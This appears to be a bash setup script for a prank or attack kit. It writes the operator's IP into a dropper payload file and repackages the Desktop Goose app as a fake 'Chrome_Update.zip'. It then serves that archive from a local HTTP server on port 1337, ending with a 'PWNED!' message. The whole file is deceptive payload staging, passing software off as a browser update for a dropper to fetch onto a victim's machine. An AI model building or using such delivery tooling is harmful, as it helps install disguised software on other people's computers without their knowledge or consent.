#!/bin/bash

#Grab your local IP to add to the payload
SRC="$(ip route show | grep default | cut -d ' ' -f 9)"

#Check if Desktop Goose is present in this directory
GOOSE="$(ls | grep 'Desktop Goose v0.31.zip')"

#Add the IP to the payload
sed -i "s/YOUR_IP/$SRC/" GooseDroper.txt

#Check 
if [ "${GOOSE}" == "" ];
then
	echo "Desktop Goose is not present in this directory, download it, or move it here"
	exit

else
	unzip "Desktop Goose v0.31.zip"
	mv "Desktop Goose v0.31/DesktopGoose v0.31" Update
	zip -r Chrome_Update.zip Update
	rm -rf "Desktop Goose v0.31"* Update
	read -p "Configuration finished! Start python webserver now? [Y/N]" START
fi


if [ "${START,,}" == "y" ];
then
	python3 -m http.server 1337 && echo "PWNED!"
else
	clear
	echo "Server not started, thank you!"
fi
